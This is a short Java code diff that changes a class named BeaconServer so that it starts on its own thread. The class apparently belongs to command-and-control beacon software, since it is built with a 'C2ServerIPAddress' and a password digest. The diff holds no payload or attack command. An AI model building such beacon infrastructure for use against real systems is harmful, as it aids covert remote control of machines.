@@ -322,7 +322,8 @@ public class BeaconServer implements Runnable{
         
         try{
             BeaconServer beaconServer = new BeaconServer(C2ServerIPAddress, passwordDigest);
-            beaconServer.run();
+            Thread beaconServerThread = new Thread(beaconServer);
+            beaconServerThread.start();
         } catch(IOException e){
             e.printStackTrace();
         }
